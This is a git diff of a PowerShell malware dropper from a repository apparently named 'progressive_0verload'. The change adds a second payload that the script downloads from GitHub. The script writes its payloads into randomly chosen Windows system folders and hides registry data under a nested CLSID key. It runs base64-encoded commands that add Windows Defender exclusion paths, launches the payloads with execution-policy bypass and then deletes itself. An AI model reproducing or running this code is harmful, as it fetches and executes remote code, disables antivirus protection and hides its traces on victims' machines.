@@ -1,5 +1,6 @@
 $initServiceRootmonmonUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_rootmonmon.ps1"
-$currLoc = "$PSScriptRoot\initializer.ps1"
+$initServiceFwdmonUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_fwdmon.ps1"
+$currLoc = $MyInvocation.MyCommand.Path
 $paths = @(
     "$env:windir\system32\config\systemprofile\AppData\Local",
     "$env:windir\System32",
@@ -24,22 +25,24 @@ $paths = @(
 )
 $initServiceRootmonmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $initServiceRootmonmonPath = "$initServiceRootmonmonPath\init_service_rootmonmon.ps1"
+$initServiceFwdmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
+$initServiceFwdmonPath = "$initServiceFwdmonPath\init_service_fwdmon.ps1"
 $g = "{$([guid]::NewGuid().ToString().ToUpper())}"
 $basePath = "HKCU:\Software\Classes\CLSID\$g\Shell\Open\Command\DelegateExecute\Cache\Backup\Runtime\Legacy\system"
 New-Item -Path $basePath -Force
 New-ItemProperty -Path $basePath -Name "mode" -PropertyType DWORD -Value 0xFFFFFFFF -Force | Out-Null
 $ms = @("WinSxS_Backup", "System32_Compat", "TrustedInstallerCache", "Edge_Telemetry", "DirectX_Logs") 
-$p = Get-Random -Count 5 -In (1..5000)
-$score = Get-Random -Minimum 1634 -Maximum 4766
+$p = Get-Random -Count 5 -In (1..2369)
+$score = Get-Random -Minimum 384 -Maximum 2023
 $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $rootPath = "$rootPath\root.ps1"
 iwr -Uri $initServiceRootmonmonUri -OutFile $initServiceRootmonmonPath
+iwr -Uri $initServiceFwdmonUri -OutFile $initServiceFwdmonPath
 
 
 
 
-
-1..5000 | ForEach-Object {
+1..2369 | ForEach-Object {
     $curr = $_
     if($p.Contains($curr)){
         $idx = 0..($p.Count - 1) | Where-Object { $p[$_] -eq $curr }
@@ -87,6 +90,7 @@ powershell -enc "cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFA
 powershell -enc "cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAZQByAHYAaQBjAGUAUAByAG8AZgBpAGwAZQBzAFwATABvAGMAYQBsAFMAZQByAHYAaQBjAGUAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAVwBpAG4AWAAiACAALwBmAA=="
 powershell -enc "cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAZQByAHYAaQBjAGUAUAByAG8AZgBpAGwAZQBzAFwATgBlAHQAdwBvAHIAawBTAGUAcgB2AGkAYwBlACIAIAAvAGYA"
 
-Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-Command", "$initServiceRootmonmonPath -rootPath '$rootPath'"
+Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-Command", "$initServiceRootmonmonPath -rootPath '$rootPath' -basePath '$basePath\yXureYzQpIRLN'"
+Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-Command", "$initServiceFwdmonPath -basePath '$basePath\yXureYzQpIRLN'"
 
 Remove-Item -Path $currLoc -Force -ErrorAction SilentlyContinue
